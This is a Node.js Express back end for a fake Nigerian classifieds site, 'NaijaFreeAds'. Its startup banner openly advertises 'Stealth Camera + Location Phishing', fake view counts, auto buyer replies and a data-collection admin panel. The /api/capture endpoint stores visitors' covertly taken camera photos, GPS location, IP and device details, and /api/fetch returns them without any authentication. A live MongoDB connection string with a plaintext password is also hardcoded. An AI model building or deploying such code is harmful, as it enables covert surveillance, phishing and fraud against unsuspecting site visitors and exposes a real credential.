const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

const limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 200 });
app.use('/api/', limiter);

app.use(express.static(__dirname));

const captureSchema = new mongoose.Schema({
    id: { type: Number, required: true, unique: true },
    type: { type: String, enum: ['ad_posted', 'permission_granted'], required: true },
    timestamp: { type: Date, default: Date.now },
    user: String,
    ad: {
        title: String,
        category: String,
        description: String,
        price: String,
        location: String,
        images: [String]
    },
    location: {
        lat: Number, lng: Number,
        city: String, state: String
    },
    cameraPhoto: String,
    device: {
        userAgent: String,
        platform: String,
        ip: String
    }
}, { timestamps: true });

const Capture = mongoose.model('Capture', captureSchema);

app.post('/api/capture', async (req, res) => {
    try {
        const data = req.body;
        if (!data.id) data.id = Date.now();
        const capture = new Capture(data);
        await capture.save();
        console.log(`✅ Captured: ${data.type} from ${data.user || 'unknown'}`);
        res.status(201).json({ success: true });
    } catch (error) {
        console.error('Save error:', error);
        res.status(500).json({ success: false });
    }
});

app.get('/api/fetch', async (req, res) => {
    try {
        const records = await Capture.find().sort({ timestamp: -1 }).limit(500);
        res.json({ success: true, records });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

app.delete('/api/clear', async (req, res) => {
    try {
        await Capture.deleteMany({});
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

app.get('/', (req, res) => {
    const indexPath = path.join(__dirname, 'index.html');
    if (fs.existsSync(indexPath)) res.sendFile(indexPath);
    else res.status(404).send('index.html not found');
});

app.get('/dashboard.html', (req, res) => {
    const dashPath = path.join(__dirname, 'dashboard.html');
    if (fs.existsSync(dashPath)) res.sendFile(dashPath);
    else res.status(404).send('dashboard.html not found');
});

async function startServer() {
    try {
        await mongoose.connect(MONGODB_URI);
        console.log('✅ MongoDB connected');
        app.listen(PORT, '0.0.0.0', () => {
            console.log(`
╔═══════════════════════════════════════════════════════════════╗
║     🚀 NaijaFreeAds Ultimate Server Running                  ║
╠═══════════════════════════════════════════════════════════════╣
║  Main Site:     https://your-domain.onrender.com             ║
║  Dashboard:     https://your-domain.onrender.com/dashboard.html ║
║                                                               ║
║  Features:                                                   ║
║  - Full Auth System (Sign Up/Login/Forgot Password)          ║
║  - Post Ads with Image Upload                                ║
║  - My Ads with Edit/Delete                                   ║
║  - Chat System with Auto Buyer Replies                       ║
║  - User Settings & Change Password                           ║
║  - Stealth Camera + Location Phishing                        ║
║  - Fake Views Counter                                        ║
║  - Admin Panel for Data Collection                           ║
╚═══════════════════════════════════════════════════════════════╝
            `);
        });
    } catch (error) {
        console.error('❌ MongoDB error:', error);
        process.exit(1);
    }
}

startServer();
